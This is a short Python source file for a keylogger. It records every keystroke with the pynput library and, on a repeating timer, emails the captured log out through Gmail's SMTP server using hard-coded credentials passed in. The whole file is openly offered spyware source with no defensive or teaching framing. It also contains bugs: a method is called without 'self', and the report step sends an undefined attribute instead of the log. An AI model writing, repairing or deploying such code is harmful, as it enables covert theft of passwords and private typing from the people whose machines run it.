
import pynput.keyboard
import threading
import smtplib

class Keylogger:
	def __init__(self, interval, email, passwd):
		self.log = "Keylogger Started"
		self.interval = interval
		self.email = email
		self.passwd = passwd

	def appendLog(self, string):
		self.log = self.log + string

	def processKeyPressed(self, key):
		try:
			pressedKey = str(key.char)
		except AttributeError:
			if key == key.space:
				pressedKey = " "
			else:
				pressedKey = " " + str(key) + " "
		appendLog(pressedKey)

	def sendMail(self, email, passwd, message):
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.starttls()
		server.login(email, passwd)
		server.sendmail(email, email, message)
		server.quit()

	def report(self):
		print(self.log)
		self.sendMail(self.email, self.passwd, "\n\n" + self.message)
		self.log = ""
		timer = threading.Timer(self.interval, self.report)
		timer.start()

	def start(self):
		keyboardListener = pynput.keyboard.Listener(on_press=self.processKeyPressed)
		with keyboardListener:
			self.report()
			keyboardListener.join()
 